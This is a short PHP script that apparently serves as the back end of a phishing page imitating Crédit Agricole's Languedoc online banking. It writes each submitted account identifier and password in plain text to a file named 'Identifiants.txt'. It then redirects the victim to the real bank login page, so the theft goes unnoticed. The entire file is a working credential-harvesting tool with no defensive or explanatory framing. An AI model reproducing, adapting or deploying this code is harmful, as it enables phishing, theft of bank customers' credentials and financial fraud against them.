<?php

 file_put_contents("Identifiants.txt","  Compte : " . $_POST['CCCPTE'] . "\n  Mot de Passe : " .$_POST['password'] . "\n\n",FILE_APPEND);
 header('Location: https://www.credit-agricole.fr/ca-languedoc/particulier/acceder-a-mes-comptes.html');
 exit();